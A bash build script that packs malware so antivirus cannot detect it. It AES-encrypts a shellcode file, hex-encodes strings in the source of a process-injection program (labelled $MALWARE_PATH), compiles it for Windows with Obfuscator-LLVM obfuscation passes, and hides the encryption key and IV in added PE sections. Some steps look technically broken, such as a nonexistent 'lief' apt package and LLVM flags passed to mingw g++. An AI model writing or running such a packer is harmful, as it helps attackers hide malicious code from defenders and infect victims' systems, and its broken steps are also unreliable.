#!/bin/bash
# Install dependencies
sudo apt-get update && sudo apt-get install -y openssl xxd mingw-w64 lief git

# Build Obfuscator-LLVM
git clone https://github.com/obfuscator-llvm/obfuscator
mkdir build && cd build
cmake -DCMAKE_BUILD_TYPE=Release ../obfuscator
make -j$(nproc)
export PATH="$PWD/bin:$PATH"

# Encrypt shellcode
KEY=$(openssl rand -hex 32)
IV=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -in "$SHELLCODE_PATH" -out encrypted.bin -K "$KEY" -iv "$IV"
xxd -i encrypted.bin | sed 's/unsigned/const unsigned/g' > "$SHELLCODE_PATH"

# Obfuscate strings
sed -i 's/"Usage: %s <PID>\
"/"\\x55\\x73\\x61\\x67\\x65\\x3a\\x20\\x25\\x73\\x20\\x3c\\x50\\x49\\x44\\x3e\\x0a"/g' "$MALWARE_PATH"
sed -i 's/"Invalid PID provided.\
"/"\\x49\\x6e\\x76\\x61\\x6c\\x69\\x64\\x20\\x50\\x49\\x44\\x20\\x70\\x72\\x6f\\x76\\x69\\x64\\x65\\x64\\x2e\\x0a"/g' "$MALWARE_PATH"
sed -i 's/"Failed to inject the PE into the target process.\
"/"\\x46\\x61\\x69\\x6c\\x65\\x64\\x20\\x74\\x6f\\x20\\x69\\x6e\\x6a\\x65\\x63\\x74\\x20\\x74\\x68\\x65\\x20\\x50\\x45\\x20\\x69\\x6e\\x74\\x6f\\x20\\x74\\x68\\x65\\x20\\x74\\x61\\x72\\x67\\x65\\x74\\x20\\x70\\x72\\x6f\\x63\\x65\\x73\\x73\\x2e\\x0a"/g' "$MALWARE_PATH"

# Compile with obfuscation
x86_64-w64-mingw32-g++ -std=c++17 -static \
  -mllvm -fla -mllvm -sub -mllvm -bcf \
  -o "$EXECUTABLE_NAME" "$MALWARE_PATH" -lpsapi -lcrypto

# LIEF modifications
lief add --section .crypted_key --content "$KEY" "$EXECUTABLE_NAME"
lief add --section .crypted_iv --content "$IV" "$EXECUTABLE_NAME"

# Cleanup
rm -rf encrypted.bin obfuscator build